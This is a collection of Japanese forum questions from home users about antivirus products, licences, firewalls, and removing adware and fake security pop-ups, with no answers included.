NortonのアンチウイルスをＣＤからインストールするために、それまで使用していたＡＶＧ２０１４をアンインストールしようとしたのですが添付ファイルのような表示がで出てきて先に進めません。コントロールパネルからも試しましたが同じ結果でした。 どなたか御指示頂ければ幸いです。
DIXIM Digital TV 2013 で　今まで　ネットテレビ見れていたのですが　esetインストールしてから　急にみれなくなり　　（お使いのパソコンのセキュリティ設定やねっワーク環境、サーバー機器の状態を確認してください）　と出て　みれなくなります　どうすればいいでしょうか ※OKWaveより補足：「ESETセキュリティ ソフトウェア シリーズ」についての質問です。
今年の７月にWindows8でガレリアのパソコンを購入したのですが、今月になってセキュリティが危険な状態にあると出てしまいます。不安でしかたありません。 マカフィー インターネットセキュリティ　15ヶ月版がインストールされているのですが、このマカフェーが危険な状態にある様なのです。 現在の症状ですが、インターネットをしていると頻繁にマカフィーの修復の画面が出る。セキュリティが危険な状態です。製品版を購入してくださいなどの画面が毎日の様に出ます。製品版購入のクレジット決算画面などがよく出ます。 グーグルクロームでインターネットが繋がらなくなった。クロームをクリックしても何も反応しません。 現在はインターネットエクスプローラーでネットをしています。 知らない間に頻繁に出るセキュリティ更新のページでなにかインストールしてしまった様で、パソコンを起動すると直ぐになぞの英語ばっかりのセキュリティが起動してスキャンが開始されます。 トロイの木馬を検出したとかなんとかで危険な状態にあるようです。 怖いので、現在はインターネットのケーブルを抜いて、ネットに接続していない状態です。 今は別のパソコンから繋いでいます。 接続を切ったとは言え、このままの状態に放置しておくのは危険なんですよね？ 実は別のパソコンでウイルスバスターというセキュリティソフトを購入しているのですが、このソフトをガレリアのパソコンに使ってもいいのでしょうか？ また変なエラーが出るのが怖くて自己判断だけで色々やってみるのは危険だと思い今回、問い合わせしたのです。 これについて返答をお願いします。
windows7　IE11　でgoogl検索を使用しています。頻繁に過去見たサイトの広告が表示され、 うっとおしくてなりません。いちいち消すのも限度があり一括して表示しないようにする方法も、ｇｏｏｇｌの広告設定など調べてもわかりません。一種のウイルスかとも思います。なんとかできないでしょうか？
Reg Clean Pro というウィルスソフトが しょっちゅう警告を出してきます。 どうしたらいいですか。
Win7を使用しています。PCの電源を入れたままにして置くと、画面が変わり『Windows7 Update』と言う画面に、勝手に変わっています。あまりにシツコイので、お聞きしますが、削除して良いものでしょうか?MS Partner とあり、McAfeeともあります。調べると、どうも悪質なモノのようで、削除したいのですが、検索しても、解りませんでした。直す方法として『Win Thruster 』と言うものを、DLするよう出るのですが、よくよく見ると、こちらも『Slim ware』と言うところが出しており、極めておかしいのでは?と思っています。削除するには、どうすれば良いのでしょうか?
パソコンが壊れたために新しいノート型パソコンを購入しました。しかし、急だったもので、PCを購入しただけで予算を使い切ってしまい、セキュリティまでお金が回りません。そこで、無料のセキュリティソフトを導入したいのですが、どれがいいのか分かりません。 教えてください。
DoCoMoのアンドロイドのスマホを使っています。 DoCoMoあんしんスキャンのマカフィ（無料版）のセキュリティソフトを使っておりますが、 最近、アバスト（無料版）をインストールして、併用して使っております。 １．セキュリティソフトの併用は、何か問題がありますでしょうか？ 今使っている限りはなさそうですが、自分が知らないだけかもしれませんので・・・ ２．パソコンではノートンを使っているので、余ったライセンス（ユーザー数）を、 スマホでも使用しようと思っています。 その場合は、今使っているセキュリティソフトをどうしたらいいでしょうか？ ・一つにする（ノートンは有料版なので、一番機能がいい！？） ・二つにする（ノートンと、DoCoMoのマカフィ（DoCoMoだから信用できる！？）） ・三つにする（そんなに入れて、競合や悪さをしないか！？） 以上です。アドバイスいただけると助かります。 よろしくお願いいたします。
Yahooから来るメールの最初の部分の幾つかに、先日より〔SPAM〕という文字が入るようになってしまいました。ダイレクトメールの類を振り分けた際に迷惑メールのフォルダに振り分けてしまったせいかもしれませんが、原因は不明。同じくYahooから来る他のアドレスからのメールには入っていません。 素人考えですが、重要なメールがあった場合、後々に勝手にプロヴァイダー側で処理されたりすると厄介なので、その前に外しておきたいのですが、方法を御存知の方、お知恵をお貸し下さい。 OSは「7」、IEは「10」、Livemail利用者です。
どうやら中国語のユーチューブを見てからウイルスに感染してしまいました。今はフリーキングソフトを使っていますが、ネットサーフィンしていくと２回目くらいから中国語に文字化けして固まってしまいます。パソコンを工場出荷状態にしたら直りますか・・・どうしたらいいでしょう、どなたか教えてください。
　 最近Windows7の動作が変だったのでTaskマネージャーで起動中のプロセスを見ると、知らないうちにLocalProxyとLocalProxyTrackerなるプロセスが動いていました。 このプロセスは手動で終了が出来ず、また同名のプログラムを削除しようとしても削除できませんでした。 取り敢えず別の起動ディスクを用いてWindowsを起動し直し、元の起動ディスクに入り込んでいた同名のプログラムをなんとか消すことは出来ました。 さて質問ですが問題のLocalProxyとLocalProxyTrackerとはどのようなプログラムなのでしょう。 通常どのようにしてPC内に入り込むのでしょうか。 分かる方教えて下さい。 　
auslogics disk defrag 5.0.0.0をインストールした時に、不注意にBitable.comが入ってしまいブラウザのホームページが乗っ取られてしまいまして！大変に困ってます！削除したくても出来ませんので、宜しくお願い致します。
自分の中で脅威を検出？そしてチェストへ移動！？ 移動したらまた出てきてファイルがありません？ 一人でなにしてるんだAvast! いつもこうやって一人遊びしてるAvast!なんですが この遊びに使われているこれらのファイルは問題ないのかな。って質問です。
PCは趣味でしか使いません。主に音楽やDVDの書き込み、動画視聴、動画変換が主で後はメールを覗く程度です。 OSはWin7、更新、Javaは削除、ブラウザはOpera、セキュリティソフトはESET、バックアップは外付けで取ってあります。ほかになにか注意しないといけないことを教えて下さい。
ネットで色々検索する際、近頃、ＰＣの機能が低下していると激しくフラッシュするバナーが執拗に出て来ます。うんざりしています。これを削除できないですか？
Windows7pro64bit使用 2014/2/22 『CouponFactor』 という物がインストールされていたらしく、 これをアンインストールしたいのですが、以下のメッセージが表示され、 「プログラムと機能」からアンインストールできません。 『Please close your browser and try again』 ブラウザ（Chrome）を落としたり、再インストールしてみましたが、効果はありませんでした。 またこのCouponFactorという物ですが、検索しても日本語ページがヒットしません。 広告を表示させるアドウエアらしいのですが、アンインストールするにはどうすれば良いでしょうか。
無料ウィルスソフト　キングダムソフト を入れたら、右上に現在の状況が 小さく緑色で表示されます。 設定で「画面に表示する」にチェックを いれていないのですが。 消すにはどうしたらいいですか。
このウィルス防止ソフトは信頼できますか？・・・ 信頼出来ないという人はいませんか？・・・・・・・・・・
すみません。　追加質問です。 現在、家のパソコンには、ノ－トンのウィルス対策ソフトがインスト－ルされています。 これは契約上パソコン3台に使えるそうで、あと1台分が残っています。 この1台分を、今回買う予定のタブレットに使えますか（=インスト－ルしても良いのですか？） 以上、宜しくお願い致します。
タブレットを購入しようと思います。 購入したら真っ先にアンチウィルスソフトをインスト－ルしようと思います。 当該ソフトをWEBで探すと、色々なものが出てきます。 http://kakaku.com/keitai/android-apps/ma_6107/ （1）無料ソフトと、ウィルスバスタ－等の有料ソフトとは、一体何が違うのでしょうか？ （2）機能が同じだとしたら、有料ソフトの存在意味は何でしょうか？ （3）無料ソフトの中で、機能的に評価の高いものはどれでしょうか？ （4）異なる無料ソフトを、2～3インスト－ルすることは、防御機能アップに 効果的でしょうか？ 以上、ご教示を宜しくお願い致します。
無知識なので教えてください。 会社で使用しているPCなのですが、 立ち上がりや、しばらく席を離れた際に パスワードを入力しなければならないようにしていましたが 設定していたら万が一の時に使えない と言われ、解除（設定をしない）しました。 このパスワードは、解除しても問題は起きませんか？ 解除しても、社内の人間に見られる可能性だけ　の問題だけならいいのですが・・・。 社内にいなくても、外部から（ウイルスとか？）侵入される可能性が高まる なんてことは、ないのでしょうか。 パスワードを設定する意味（目的）を 教えてください。
個人宅一台で使用しております。 Windows 7 Ultimate 32bit フリーのアンチウイルスソフト+Windows Firewallだけでは十分ではないのでしょうか。 どうぞ宜しくお願い致します。
セキュリティーについていろいろ調べているところです。 ゼロデイ攻撃ではソフトウェアの弱点が修正される前の攻撃なので防ぐことはできないのですよね？
Win7のパソコンを使用して、ウイルスバスターを入れています。 最近、パソコンのシャットダウンのボタンをクリックしても、パソコンが反応しないでシャットダウンができないことがありました。しばらくしてやったら、シャットダウンできました。 再起動のボタンをクリックしたときも、同様のことがありました。 このパソコンを使い始めて2年以上、こんなことは初めてです。 このような挙動がある場合は、ウイルスに感染した可能性はあるでしょうか?
ブラウザでサイトを見ていたところ、添付画像のような表示が出ました。 ウィルス対策としてアバスト！モバイルセキュリティを入れているのに感染するのかなと思い、 DUバッテリープロテクター　というアプリはダウンロードせずブラウザを終了し、 アバスト！モバイルセキュリティ　でウィルススキャナを実行しました。 特に何も検出されなかったので感染していないのかと思うのですが、アバスト！モバイルセキュリティのウィルススキャナでは検出されないこともありえるのでしょうか？
　ＰＣ、のパフォーマンスが低下しています。 と、表示される事があります。 「ＰＣのパフォーマンス」とは何でしょうか？ 「今すぐ修復」をクリックしても大丈夫なんでしょうか？ ごみ箱がいっぱいというような事も影響あるのでしょうか？ ウイルスのような悪いものを考えるとクリックがなかなか 出来ません。 　アドバイスをお願いできないでしょうか。 　宜しくお願い致します。
10/09頃から、ウイルスバスターのアイコンが(右下のタスクバーの)灰色になり←起動して見ると、「保護機能が無効です」と出て←再起動をとの表示で再起動するとほんの一寸の間は正常ですが又すぐに同じ症状の為、本日(10/10日)←かんたん!インストール←と言うページから自動でinstallしました、問題は解決したのですが、今までとは、表示が全然異なってしまったので、操作方法の一部が出来ません(判らない) ---- 今までは(かんたんスキャンと、指定ドライブの選択の)方法が選べましたが、←今回のバージョンでは、指定ドライブの選択がありません。 ドライブを指定して、スキャンの方法を教えて下さい(バスターのホームページは行って見ましたが判りませんでした) 宜しくお願致します。
ｆｉｌｍｓｃａｎｅｒ　を購入し使おうとしたときに、、webカメラを使うかどうかというkingsoftからの警告が出てで、間違って、「つかわない、その警告はもう出さない」とクリックしてしまった。　film読み取りカメラは必要なので、その設定を変更したい。どうしたらいいのか教えて。
OSはWindows8.1を使ってネットに常時接続しています。 最近、「IDとパスワードの不正利用が発覚しました」と各所からお知らせメールが来ることがいくつかあり、PCセキュリティが他人ごとではなくなってきたと感じています。 現在、悪意のあるソフトの感染防止対策としては、Windows8.1標準の「Windows defender」のみです。また使用しているブラウザー「Firefox(32)」が怪しいサイトをに飛ぼうとしたときに、読み込まずに警告画面を表示して知らせてくれます。 ・Windows　Defenderがどの程度の防御力があるのかイマイチよく分からず、Windows　Def...以外の感染予防ソフトは必要かどうか教えていただけないでしょうか。 ・また実績のあるおススメのソフトがあったら教えてください。よろしくお願いします。
NortonInternetSecurity(多分2009だと思うのですが) ひとつで３台までインストールＯＫなのを購入して 家のパソコン３台に入れてました しかしうち一台がＸＰだったので、このＸＰのパソコンだけコンパネからネットに繋ぐことができないようにしました (サポート終了のため) そして最近ＯＳ７のパソコンを安く買って来ました NortonInternetSecurityも一台分購入しなければならないなと思ってたのですが よく考えるとＸＰはもう繋げなくしてしまってるので この分がまだ一年と少しあります このＸＰに入れてたNortonInternetSecurityの有効期限を新しく買ったＯＳ７の分に入れるのはどうしたらよいでしょうか？
Androidのスマホを利用しています。 CM Security というセキュリティー（ウィルス対策？）アプリを使ってみたのですが、 アプリが危険と出した結果が英文なので、よく分かりませんでした。 意味も分からず実行して、脅威を排除して安全な状態にしましたが、そこで出てきた英文の意味も分かりません。 添付画像を御覧になり、どういう意味か教えて下さい。 あと、何が危険と判断される要因だったのか、推測できるなら教えて下さい。 何か変なアプリを入れたのが原因でしょうか？
写真、比較的大きな動画ファイル、書籍ファイルを 今まで暗号化ソフトを利用していたのですが、この方法だと結構な頻度で ファイルが破損しゴミファイル化してしまいます。 特に動画。 しかし、ネットでの流失などウイルス対策を考えると一番安全なのかと勝手に思ってます。 一般的な隠しファイルというものは、ウイルスやスパイウェアにかかった場合など 大事な隠しファイルも流失のおそれが発生してしまうのですよね？ ネットワーク上からは何も隠れてないとの認識です。 これだと安全ではないので、この方法はしていません。 また、DVDなど記録媒体で、 暗号化せずにそのまま保存する方法は、DVDを盗む、紛失するなどがないかぎり ネットでの流失などウイルスに関係することはないのでしょうか。 大事なファイル、どのような保存がいいでしょうか？ 何の対策にもならないパスワード付きZIPがいいという回答はお控え下さい。 よろしくお願いします。
現在PCは３台所有しております。組立のデスクトップ２台とノート１台です。 最近変な画面が出るようになりました。 セキュリティソフトを購入しようと考えております。ソフト会社が５社もあり、無料体験版を使用しましたが、いざ、購入しようとすると価格がかなり差が有り３年版購入するにはどこが良いか教えてください。 カスペルスキー、ESET,シマンテック、トレンドマイクロ、マカフィーのセキュリティソフトです。 PCソフトは８．１とビスタです。
現在PCは３台所有しております。組立のデスクトップ２台とノート１台です。 最近変な画面が出るようになりました。 セキュリティソフトを購入しようと考えております。ソフト会社が５社もあり、無料体験版を使用しましたが、いざ、購入しようとすると価格がかなり差が有り３年版購入するにはどこが良いか教えてください。 カスペルスキー、ESET,シマンテック、トレンドマイクロ、マカフィーのセキュリティソフトです。
OSは、ウィンドウズ8.1を使っています。 OS起動時には、PCのいくつかの機能がスタートアップします。 例えば、スピーカー・ネットワーク・アクションセンター・スカイドライブなどです。 ウイルス対策ソフトもスタートアップするのですが、いつもこれらのスタートアップの中でビリなんです。 ウイルス対策ソフトは、なるべく初期段階に立ち上がり、監視をしてほしいのですが。 スタートアップの状況を見ていると、ウイルス対策ソフトのアイコンがタスクバーにが現れる前に、すでに通信しているようで少し不安です。 スタートアップのできるだけ早い段階でウイルス対策ソフトを自動起動させる方法を教えてください。
ソニーのバイオVGN-FS33BというXPノートを持っています。 これを外部ストレージに保存されている動画再生専用に使おうと思っています。 がしかし、これがウイルス感染している可能性があります。 動画を保存している外部ストレージは、他の健康なPCに繋ぐこともありますので、VGN-FS33Bのウイルス問題をクリヤーにする必要があります。 現在、VGN-FS33Bにはウイルスソフトは入っていますが、期限切れで定義更新されていません。 もし感染していれば、期限更新しても、ウイルス定義更新も上手くできないと判断していますので、期限更新する気はないです。 期限更新にはお金もかかることですし、、、 リカバリーしてしまおうと思ったのですが、残念ながらリカバリーCDがありません。 HDD内にもリカバリーエリアはありません。 起動させてリカバリーCDを作ろうかと思ったのですが、もしウイルス感染していたら、作成したCDにもウイルスが入るかも知れないと危惧しています。 そこで質問です。 1.現状のままでリカバリーCDを作成できた場合、CD内にウイルスが入る可能性があるでしょうか？ 2.VGN-FS33BのHDDを外し、外付HDDケースにマウントし、他のPCにUSB接続し、ウイルススキャンして、検出されなければ、ウイルス感染に関しては問題ないでしょうか？ ただ、この方法はUSB接続したPCも感染させてしまう可能性を考えるとあまり乗り気ではないです。 やはりこのVGN-FS33Bの使用は諦めた方が良いのでしょうか？ 識者の皆様、ご教授、ご意見の程、宜しくお願い致します。
スマホのウィルス対策にKaspeskyのセキュリティソフトのライト版をインストールしたんですが、これで普通に使う場合は大丈夫でしょうか？ 他におすすめのセキュリティソフトがあったら教えてください。 よろしくお願いします。
最近では、kingsoft　Internet Security　の人気が出てきてaviraエンジンも搭載していますね。 私は、昔のダメな頃のkingsoftを知っているのであまり使いたくないのですが、 キングソフト2013までは圧倒的にウイルスの検索能力はAviraが勝っていたのですが kingsoft2014になってからは、aviraの完敗なのでしょうか。 自身のパソコンで一年ほどずっと実験をしてるのですが、何度やってもAviraが勝てません。 「kingsoftのAviraエンジンは、Aviraのソフトで動かしているエンジンほど強力ではない。」 といった情報がネットにも流れていますが、 私の実験ではたとえkingsoftで使われているaviraエンジンが aviraソフトより弱くても、客観的に見て最終的なウイルス対策として有効なソフトは Aviraよりkingsoftとなってしまいました。 こんなことってありますか。アンチキングソフトが、日本に多いのは知っていますが、 私は、そのアンチではなく、Aviraファンだったのです。 もう、aviraだけでは生きていけないということですよね。 でも、aviraは消したくないです。 kingsoftとAviraを同一のパソコンに入れてもいいでしょうか？ また、私はaviraの有料版を使っていたのですが、 kingsoftとAviraの無料版なら更に差は広がりkingsoftにコテンパンにやられてしまうのでしょうか。
PCやネット環境にまぁまぁ詳しい方（そういう関係の会社の方）に聞いたのですが OSがWindowsの場合 ・メールソフトを使っていない、アカウントを取得していない ・ファイアウオールが作動している ならば、ウイルスバスターなどの有料ソフトはいらない もちろん会社のPCなら必要だけど、家庭のPCなら大丈夫。 実際にその会社の人で自宅のPCに有料ソフト使ってるのは少数だそうです そこで質問です 実際にファイアウオールだけで対処されている方はいらっしゃいますか？ また、メールソフト以外で何か気を付けることはありますか？ 「有料ソフトは必要ですよ」みたいな回答はいらないですので、お願いします
【環境】 ・MacのBoot Campでwindows７ ・firefox 32.0.3 【内容】 インターネットしていると、勝手にポップアップウィンドウで広告が出現します。 例えば日経新聞のサイトを開いて、どれか記事をクリックすると出現します。 firefoxは最新のものにアップデートしており、ウィルスバスターでチェックしてもウィルスは見つかりませんでした。 また、Internet Exploreは問題ありません。 で、添付ファイルにある警告が現れるのですが、 これは“正しい警告文”なのでしょうか？ といいますのも、この警告文と同時に新しいタブが開いて、別ページに飛ばそうとするのですが、 そのページは詐欺ページですと警告が出るからです。 どうすれば、不正ページを出現させないようにできますか？ ご教授いただけますようお願い申し上げます。
現在富士通windows7のPCを使用しています。ウィルス対策なしでiTunesを使っていたりして、スパイウェアが入ったのかしりませんが、電源がつくまでにものすごい時間がかかります。無料のウィルスバスターでも入れようかと思ったのですが、思うようにいかなくてこまっています。まず、電源がついてから、デスクトップ画面の復帰が時間かかりすぎ。これは何が原因なのでしょうか。また、無料でどのウィルスバスターがいいのでしょうか？
セキュリティーソフトをインストールしています。 ぶろばいだーのメールを使用していればスムースに送信できます。 しかしながら会員登録のようなものですといろいろと打ち込み送信します、すると 「守りたい情報」の送信を中断しました。」 これでメールは送られないのです。 相手が公立の図書館でも送信できない。 どうしたらいいのか教えてください。 セキュリティーソフトは　TREND月額版　使用 Windows8.1使用
具体的な使い方も教えてくだされば助かります
「Windows defender とウイルスバスタークラウドの両方が無効になっています。」 と表示されます。 あとはたまに、「～日間、暗号化されていません」？みたいな表示がされるときもあります。 曖昧ですみません。 何をしたらよいのでしょうか。 パソコン保護にあまりお金かけたくないのですが、どうしたらいいかアドバイスをお願いします。 Windouws8のノートパソコンを使っています。
AVGの２０１３Free版でを使用中で、 ImgBurnのダウンロードに関して質問します。 ImgBurn日本語をダウンロードすると、トロイの木馬とでて、保護（処理）しますか・・・ そこで、OK（はい）をクリックすると、当然ですが、メモファイルくらいしか落ちません。 「Malsign,Generic.84A」　「ImgBurn.exe」　と表示されます。 これは、誤認識なのでしょうか。 http://img-burn.joydownload.jp/?c=5&gclid=CNPWxM … ここからダウンロードしています。 他のPCでは、SpybotとKingSoftSecurityの組み合わせなのですが、トロイと出ないです。 どちらが正しいのでしょうか。 また、Imgburnの安全なサイトは他にあるんでしょか。 最近では、KinｇsiftSecurty無料でも、かなりいけるようですが、 そこも加えて、おしえてくださいますようお願いいたします。
WINDOWS'7 avast! Lenovo G570 を使っています。 先日教えていただきながらSSD 換装をして安定を確認しています。 今日avast! にないファイアウォールを入れようと COMODO Internet Security をインストールしたのですが グーグル画像検索ででてきた芸能人とかの画像を キャプチャrapture-2.2.0 で行うと画面が黒くなってしまいます。 子供の画像制限でしょうか？違法画像ではありません。 解除設定ができるのでしたら教えていただけますか？ よろしくお願いします。
もうすぐNortonの有効期限が切れるので、購入を考えています。 しかし、現在海外に滞在中。 あと数か月滞在予定で、こちらにいる間に期限が切れてしまいます。 また、パソコンは日本から持ってきたものを使っています。 購入画面を開くと、現地語のページで通貨も現地のもの。 住所を記入する欄には、すでに現地の国名が入っています。 数か月の間なので、住民票も日本にあるのですが、この場合滞在先の住所を入れたのでも大丈夫でしょうか。 そもそも、購入自体できるのでしょうか。 ちなみに、支払いにおいてはカード払いが可能です。
「お使いのパソコンがクラッシュ寸前です」 などの広告をブラワザに表示させるウィルス削除方法についてです。 以前はGoogle Chromeの　 ・メニューから、ツール→拡張機能　→見慣れない拡張機能を消す　　 とパソコン再起動まで広告非表示にできていましたが、ウィルス広告が表示されても　拡張機能に表示されなくなってしまいました。 コントロールパネルやらCドライブやら数時間かけて探しまわってやっと原因を突き止めると、 ・Google Chrome のメニューから　ツール→タスクマネージャー　　にいる「SuperAdRomove」が原因でした。（画像参照） コイツのプロセスを強制終了させればウィルス広告は一旦なくなりますが、　GoogleChromeを 一度閉じてまた起動したり、パソコンを再起動したりするとまた出てきます。 今回　拡張機能から逃げ消えてChromeタスクマネージャーに移動して隠れてしまっていたので、 また同じようにタスクマネージャーから行方をくらませる前に、コイツを永久撲滅したいです。 SuperAdRomoveのウィルス広告を完全に削除する方法を教えて頂けますと幸いです。 宜しくお願い致します。 　　
ウィルスバスター3年版を購入しています。 しかし、「有効」になりません。 ソフトを入れると「インストールされています」との表示が。 有効にするには、どうしたらいいですか。 Windows8です。 今まで Windows7でしたので、使い方もまだ不慣れです。
市販の総合対策型ソフトの購入を検討しております。 使い勝手より防御性能重視で選ぶ場合、どういった点を見るべきでしょうか。 よろしくお願いいたします。 Windows 7 Ultimate 32bit メモリ　8GB HDD 1TB
http://www.itmedia.co.jp/news/articles/1409/17/n … これって大変な事態ですよね。 どうしてこういう状況になっているのでしょうか。もしくは思われるでしょうか。 また、対策はあるのでしょうか。 よろしくお願いしたします。
ＧＯＭプレイヤーの動作がおかしくなったので再インストしました。 そこでウイルスバスタークラウドのログを確認したら、先週頃スパイウェアを６３件検出して 削除していることが分かりました。 SaveSenseLiveというものです。 少しググってみたのですが、やっかいなものらしいのでどのように削除したら良いかと 悩んでいます。 現在、以下のフォルダが　空になっています。 C:\Program Files (x86)\SaveSenseLive\CrashReports C:\Program Files (x86)\SaveSenseLive\Update\Download C:\Program Files (x86)\SaveSenseLive\Update\Install C:\Program Files (x86)\SaveSenseLive\Update\Offline\{45598FA4-44CD-4AF0-BD0A-3A9C672AD26A} ただし、下記のフォルダにまだｍｓｉが残っている状態です。 C:\Program Files (x86)\SaveSenseLive\Update\1.3.23.0 下記のファイルが残っています。 SaveSenseLiveHelper.msi この状況でどのように対処したらいいのでしょうか。 詳しい方のご助言をお願いします。
家庭内でルーターで２台のパソコンを繋いでたとします。１台がＤＬしてウイルスなどに感染した場合、もう１台のパソコンも影響を受けたりするんでしょうか？
自宅で使っているパソコン（OSはWin.7、内蔵HDDは５００GB ）　についてなのですが、動画やハイレゾの音楽など、比較的大きなファイルを格納するためにNASを設置しています。　　自宅内の有線LANに接続しています。　　大きさは、２TBのHDDです。　　 このNASについて、ウィルススキャンやデフラグの処理をしたいのですが、どうすればよろしいのでしょうか、やり方について教えてください。　　　なお、パソコン本体のウィルス対策には、マカフィーを使っています。 よろしく。
今日こんなニュースが流されました。 http://headlines.yahoo.co.jp/hl?a=20140917-00000 … パソコンにウイルスが入り込んでネットバンクにアクセスすると偽の認証画面を表示させて文字列や暗証番号を盗み取ると書かれています。 同じくこちらのニュースではトレンドマイクロ（東京）が販売しているウイルス対策ソフトを使用するパソコンから検出され件数は2万件を超えた。 http://www.itmedia.co.jp/news/articles/1409/17/n … ところが上のyahoo news の下の方にウイルスバスターには不正サイトへのアクセスや認証情報の不正送信をブロックするWebレピュテーション機能というのがあるらしいのですが、最新のウイルスバスターがインストールされていたパソコンでは不正送金をまぬがれたのでしょうか。
ALyacというソフトを使っていたのですが、提供などのサービスは終了していますよね？ パソコンを起動した時に毎回このセキュリティソフトのスキャンが始まるのですが、、、 このスキャンは擬似擬似なのでしょか？ パソコン初心者なものでよく意味が分かりません。 この状態についてわかる方がいらっしゃいましたら、ご説明をよろしくお願いします。 ご回答のほど、よろしくお願いします。
パソコン用のセキュリティソフトでスキャンをかけた時に、 必要なクッキーを残す機能がある、セキュリティソフトは どのメーカーの製品でしょうか？ ソニー銀行のネットバンクにログインする際にクッキーが 消えているため、毎回パソコンの再登録をしなければな りません。 安全上は必要なのはわかるのですが、何か良い製品は 無いのでしょうか？ よろしくお願いします。
マカフィーで「怪しいプログラムをブロックしました」とポップが表示されてしまいました。 削除ボタンを押したり、手動で削除しようとしても全く削除できません。 また、インターネットを開くと「空白のページです。」と表示されてしまうようになりました。 このプログラムを消しても良いのか。 どのように消すのか。 或いは、このマカフィーの表示を消す方法は無いか？を知りたいです。 PCあまり得意ではないので、分かりやすい説明して頂けると助かります。 よろしくお願い致します。 （NECのWindows8　を使用してます）
フリーのデスクトップタイマーをダウンロードし、インストールの時に何かのチェックを外しそびれたせいか、余計なものまで入ってしまいました。コントロールパネルに現れたallgeniusというのは何か、検索したらヒットしたのは明らかに機械翻訳の怪しい日本語でallgeniusの危険性だの、アンインストール方法だのが述べられた多数のサイトです。マカフィー等ウイルススキャンのメーカー系のウイルスリストには該当するものがありません。 とりあえずコントロールパネルでアンインストールして、Microsoft security essentials でスキャンしたところ、何も検出されませんでした。 このallgeniusとは一体何なのか、怪しいサイトのいう通り脅威なのか、ご存知の方はいらっしゃいませんか。 怪しいサイトの更新日がいずれも今年夏以降なので、新手のウイルスでないか心配です。
ネット使用中に「使っているJAVAが古い」とのアナウンスで、思わず偽物JAVAをダウンロードしてしまいました。 GOOGLE CHROMEから「アクセス先でフィッシング行為を検出しました。悪意のあるユーザーが、パスワード、メッセージ、クレジット カード番号などの情報を盗み取ろうとしている可能性があります。」と警告があったり、急に他のサイトに飛んだりするのでウィルス感染した事に気づきました。 急いでダウンロードした偽物JAVAをアンインストールし、AVIRA無料版でスキャンしたのですが一向に改善しません。 どなたか修復方法を教えて頂けないでしょうか？ OSはWINDOWS8.1です。 宜しくお願い致します。
Windows 7使用 頭の中がこんがらがってしまったので教えて下さい。 ブロードバンドルータのファイアウォール機能と、たとえばノートンに付いているファイアウォールとは何が違うんでしょうか。 それと、Windows Firewallだけではダメなのでしょうか。 どうぞよろしくお願いいたします。
ウィルス・スパイウェア・アドウェア・マルウェアなどの感染 に有利なウィルス対策ソフトを教えて下さい。 上記ソフトはネットで探していますが色々とあってどれが良いのかわかりません。 それに以前ウイルスソフトのお試し期間をダウンロードしたところネットの接続が悪くなったり、ＰＣが不安定になってどうしようもなくなったことがあり、有料のソフトも怖いです。 何か良いものがあったら紹介して欲しいと思っています。 今現在はSysweak Support DockのPC　Cleaner　を使ってます。 PC Cleanerの評価をお伺いしたいと思います。
こんばんは。 Windows XPを使っています。 ウイルス対策ソフトはavastを入れています。これに組み合わせても衝突しない無料のパーソナルファイアウォールを教えて下さい。
パソコンがウイルスにやられてしまい、初期化しました。 これまではカスペルスキーでPCとスマートフォンを保護してました。 これを引き継ぐことはできるのでしょうか？ 再度お金を掛けるとなるのはかなり厳しいので、できれば継続したいのですが・・・ サインインしてみようと思ったのですが、メールアドレスが登録されていませんでした。 それもまたおかしいのですが・・・ 情報よろしくお願い致します。
無料アンチウイルスソフトと無料パーソナルファイアウォールのおすすめの組み合わせを教えて下さい。
日本語講師をスカイプでするにあたって海外の人（生徒）とＩＤを交換するのですが、これは安全なのでしょうか？会社を通していますが、ハッキングが得意な人が生徒を装って私のパソコンに進入できたり、ウイルスのついたＵＲＬなど送ってきたたらと思って不安になりました。
PCに複数のウイルス対策セキュリティソフトをインストールすることについて 上記は「アンチウイルスソフト同士が競合し、互いの機能を無効化し合い、ウイルス対策としてろくに機能しなくなるので愚行である」 ということで正しいでしょうか。
不覚にも海外のサイトで動画をダウンロードしてしまい、結果、恥ずかしながらウイルス（スパイウェア？）にかかってしまいました。 症状としては、(1)何かしらのリンクを開こうとすると同時にMacKeeperの広告が新しいウインドウで開かれる（どこか別のアドレスを経由してMacKeeperのページに飛ばされているみたいです）（たまにbulletflix.comという動画サイトにも飛びます）(2)グーグルでの検索表示ページに色んな広告が出る(3)文章中の数字や特定の文字に勝手に広告リンクを張られる(4)何もリンクが張られていないところでクリックやダブルクリックするとMacKeeperの広告が新しいウインドウで開かれる、等です。 おそらくダウンロードしてしまったものはMacKeeper、XPlayerだと思いますが、どちらもゴミ箱から削除してしまいました。 使用しているものはOS Xです。 ウイルス等には全く詳しくないのに信用ならないものをダウンロードしてしまって大変後悔しています。このような広告が出る原因もつかめません。 どなたかご教示ください。
Reg clear proをいつの間にかインストールしてしまったらしく、アンインストールしたのですがそれ以降も広告が大量に出ます。 またそれ以降、それまで動画サイトで普通に再生できていた動画が、全て読み込みが終わらないと再生ができなくなりました。 Adwcleanerなどで対処したりしてみたのですが、全く改善しませんでした。 解決法がわかる方いらっしゃいますか？
差出人不明の人物からのメールが届き、圧縮した添付ファイルがついていました。 知っている人かとも思ったので、添付ファイルをダウンロードしてしまいました。 ここで、やっぱり危険かも、と思って展開していないのですが、このまま展開せずに削除すれば、何かの悪さするものだったとしても、問題は発生しませんか？ ちなみに、すでに削除していますが。
PCを起動すると以下のことがブロックされました 安心してください、あなたのＰＣはアバストが守りました ってでます。 xxp://winsspeederget.info/sp32_64_10016650054590276074.dll 感染 Win32:BProtect-J [Trj] どこで何を踏んだのかはわかりませんが最近ずっとＰＣを起動するたびにでます。 アドウェアっぽいのでAD-Awareを入れてフルスキャンしてひっかかったものを削除したのですがまたＰＣを再起動しても同じことが起こります、すいませんがこれを直す方法がわかる人よろしくお願いします。
ads by internet speed checker というところからWebを開くたびに公告が出ています。 どうやったら出ないようになりますか。 ウイルススキャンをしても異常がでません。 Windows7を使用しています。 回答よろしくお願いします。
先月auでセキュアエニウェアの契約をしました。それでwindowsパソコンで登録をしたいのですが、どーしたらいいのでしょうか？
いろいろ試した結果、現在はキングソフトのウイルス対策ソフトを使っているのですが、 フルスキャンについて疑問に思うことがあるので質問させていただきます。 フルスキャンは、文字通り、コンピューター内全てチェックすることだとおもいますが、 手動スキャンでコンピューター内全てチェックを入れて、スキャンするのを比べて スキャン完了までの時間が非常に短いようです。 これは、フルスキャンのほうが検査項目が少ないためでしょうか。 windows7 64bit corei3 で外付けハードディスク1TBを付けた状態でスキャンしました。 検査時間が長いのは、フルスキャンでは、外付けハードディスクは、検査項目に入っていないからでしょうか。
